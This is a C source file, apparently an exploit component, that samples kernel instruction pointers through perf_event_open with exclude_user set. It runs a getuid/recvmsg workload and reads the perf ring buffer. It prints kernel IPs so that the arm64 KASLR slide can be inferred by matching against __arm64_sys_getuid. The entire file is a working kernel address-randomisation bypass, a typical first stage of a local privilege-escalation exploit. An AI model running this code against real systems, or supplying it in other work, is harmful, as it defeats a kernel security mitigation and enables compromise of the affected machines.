/*
 * Lightweight KASLR IP sampler.
 * One software CPU_CLOCK perf event, sample IP only, exclude_user=1, and a
 * getuid()/recvmsg() workload.  The sampled kernel IPs are printed for offline
 * slide inference (match against __arm64_sys_getuid).
 */
#define _GNU_SOURCE
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef __NR_perf_event_open
#define __NR_perf_event_open 241
#endif

#define PERF_TYPE_SOFTWARE 1
#define PERF_COUNT_SW_CPU_CLOCK 0
#define PERF_SAMPLE_IP 1ULL
#define PERF_RECORD_SAMPLE 9

struct perf_event_attr_min {
    uint32_t type;
    uint32_t size;
    uint64_t config;
    uint64_t sample_period;
    uint64_t sample_type;
    uint64_t read_format;
    uint64_t flags;
    uint32_t wakeup_events;
    uint32_t bp_type;
    uint64_t bp_addr;
    uint64_t bp_len;
    uint64_t branch_sample_type;
    uint64_t sample_regs_user;
    uint32_t sample_stack_user;
    int32_t clockid;
    uint64_t sample_regs_intr;
    uint32_t aux_watermark;
    uint16_t sample_max_stack;
    uint16_t reserved2;
    uint32_t aux_sample_size;
    uint32_t reserved3;
};

static int perf_open(void) {
    struct perf_event_attr_min attr;
    memset(&attr, 0, sizeof(attr));
    attr.type = PERF_TYPE_SOFTWARE;
    attr.size = 112;
    attr.config = PERF_COUNT_SW_CPU_CLOCK;
    attr.sample_period = 100000; /* 100 us */
    attr.sample_type = PERF_SAMPLE_IP;
    attr.flags = 1ULL << 4; /* exclude_user */
    return (int)syscall(__NR_perf_event_open, &attr, 0, -1, -1, 0);
}

int main(int argc, char **argv) {
    int secs = argc > 1 ? atoi(argv[1]) : 2;
    int fd = perf_open();
    if (fd < 0) {
        printf("perf_event_open: %s\n", strerror(errno));
        return 1;
    }
    size_t pg = 4096, ring_len = pg * 9;
    void *ring = mmap(NULL, ring_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (ring == MAP_FAILED) {
        printf("mmap: %s\n", strerror(errno));
        return 1;
    }
    int nl = socket(16, 3, 0);
    char buf[64];
    struct iovec iov = {.iov_base = buf, .iov_len = sizeof(buf)};
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    unsigned long long n = 0;
    for (;;) {
        for (int i = 0; i < 200; i++) {
            syscall(SYS_getuid);
            if (nl >= 0)
                syscall(SYS_recvmsg, nl, &msg, 0x40);
        }
        n++;
        clock_gettime(CLOCK_MONOTONIC, &t1);
        if (t1.tv_sec - t0.tv_sec >= secs)
            break;
    }
    unsigned long long head = *(volatile unsigned long long *)((char *)ring + 8);
    unsigned long long tail = *(volatile unsigned long long *)ring;
    unsigned char *data = (unsigned char *)ring + pg;
    unsigned long long mask = pg * 8 - 1;
    int printed = 0;
    while (tail < head) {
        unsigned char *rec = data + (tail & mask);
        uint32_t type;
        uint16_t size;
        memcpy(&type, rec, 4);
        memcpy(&size, rec + 6, 2);
        if (size == 0)
            break;
        if (type == PERF_RECORD_SAMPLE) {
            uint64_t ip;
            memcpy(&ip, rec + 8, 8);
            if (ip >= 0xffffffc000000000ULL) {
                printf("IP %#llx\n", (unsigned long long)ip);
                printed++;
            }
        }
        tail += size;
    }
    printf("loops=%llu samples=%d\n", n, printed);
    return 0;
}
